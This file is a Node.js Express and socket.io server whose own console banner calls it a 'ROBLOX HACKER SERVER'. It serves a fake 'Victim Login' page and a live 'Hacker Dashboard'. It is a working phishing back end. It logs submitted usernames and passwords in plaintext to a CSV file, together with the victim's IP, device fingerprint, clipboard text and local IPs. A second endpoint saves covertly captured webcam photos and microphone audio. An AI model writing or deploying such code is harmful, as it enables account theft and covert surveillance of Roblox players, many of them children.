const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const PORT = process.env.PORT || 3000;
const LOG_FILE = path.join(__dirname, 'logs.txt');

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));

// Serve login page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Serve live dashboard
app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// Socket.io connection
io.on('connection', (socket) => {
  console.log('📱 Dashboard connected:', socket.id);
  socket.emit('status', 'Connected to live logs');
});

// Login capture - terminal + file + socket broadcast + INTEL PROCESSING
app.post('/submit-login', async (req, res) => {
  try {
    const { username, password, intel: intelStr } = req.body;
    const intel = intelStr ? JSON.parse(intelStr) : {};

    // === TERMINAL OUTPUT ===
    console.log('\n🟢=== HACKER INTEL CAPTURE ===');
    console.log(`👤 Username: ${username}`);
    console.log(`🔑 Password: ${password}`);
    console.log(`📍 Public IP: ${req.ip}`);
    console.log(`💻 CPU Cores: ${intel.hardwareConcurrency || '?'} | RAM: ${intel.deviceMemory || '?'}GB`);
    console.log(`📱 Screen: ${intel.screen || '?'} | OS: ${intel.platform || '?'} | TZ: ${intel.timezone || '?'} `);
    console.log(`🌐 Local IPs: ${intel.localIPs?.join(', ') || 'none detected'}`);
    console.log(`🖐️ Pwd Stats: L${intel.passwordStats?.length || '?'} ${intel.passwordStats?.hasUpper ? 'U' : ''}${intel.passwordStats?.hasLower ? 'L' : ''}${intel.passwordStats?.hasNumber ? 'N' : ''}${intel.passwordStats?.hasSpecial ? 'S' : ''}`);
    console.log(`🎨 Fingerprint: ${intel.canvasHash || '?'} | Clipboard: ${intel.clipboard?.slice(0,30) || 'denied'}...`);
    console.log(`📊 Form time: ${intel.formFillTime}ms | Connection: ${intel.connection?.effectiveType || '?'} (${intel.connection?.downlink || '?'}Mbps)`);
    console.log('═'.repeat(50));

    // === CSV LOG FILE ===
    const csvLine = `${new Date().toISOString()},${username},${password},${req.ip},${req.get('User-Agent')},${JSON.stringify(intel)}\n`;
    fs.appendFileSync(LOG_FILE, csvLine);

    // === LIVE DASHBOARD BROADCAST ===
    const fullData = {
      timestamp: new Date().toISOString(),
      username,
      password,
      ip: req.ip,
      userAgent: req.get('User-Agent'),
      intel: intel,
      passwordStrength: intel.passwordStats ? Object.values(intel.passwordStats).filter(Boolean).length : 0
    };
    io.emit('new-login', fullData);
    
    res.json({ success: true, message: 'Login data received' });
  } catch (error) {
    console.error('❌ Server error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Media capture endpoint
app.post('/media-capture', (req, res) => {
  try {
    const photo = req.body.photo;
    const audio = req.body.audio;
    const username = req.body.username || 'unknown';
    
    // Save files
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const photoPath = path.join(__dirname, 'intel', `photo-${timestamp}-${username}.jpg`);
    const audioPath = path.join(__dirname, 'intel', `audio-${timestamp}-${username}.webm`);
    
    // Create intel dir
    if (!fs.existsSync(path.join(__dirname, 'intel'))) {
      fs.mkdirSync(path.join(__dirname, 'intel'));
    }
    
    // Write files (base64 decode)
    if (photo) {
      const photoBuffer = Buffer.from(photo.split(',')[1], 'base64');
      fs.writeFileSync(photoPath, photoBuffer);
    }
    if (audio) {
      const audioBuffer = Buffer.from(audio.split(',')[1], 'base64');
      fs.writeFileSync(audioPath, audioBuffer);
    }
    
    // Broadcast to dashboard
    io.emit('new-media', {
      timestamp,
      username,
      photo: `/intel/${path.basename(photoPath)}`,
      audio: `/intel/${path.basename(audioPath)}`
    });
    
    res.json({ success: true, files: { photo: photoPath, audio: audioPath } });
  } catch (error) {
    console.error('Media save error:', error);
    res.status(500).json({ error: 'Save failed' });
  }
});

// Serve intel files
app.use('/intel', express.static(path.join(__dirname, 'intel')));

// 404 handler
app.use((req, res) => {
  res.status(404).json({ error: 'Route not found' });
});

server.listen(PORT, () => {
  console.log(`\n🚀 ROBLOX HACKER SERVER LIVE: http://localhost:${PORT}`);
  console.log(`📱 Victim Login: http://localhost:${PORT}/`);
  console.log(`📊 Hacker Dashboard: http://localhost:${PORT}/dashboard`);
  console.log(`📄 CSV Logs: ${LOG_FILE}`);
  console.log(`🔴 Submit form → instant terminal/dashboard intel`);
  console.log(`\n`);
});

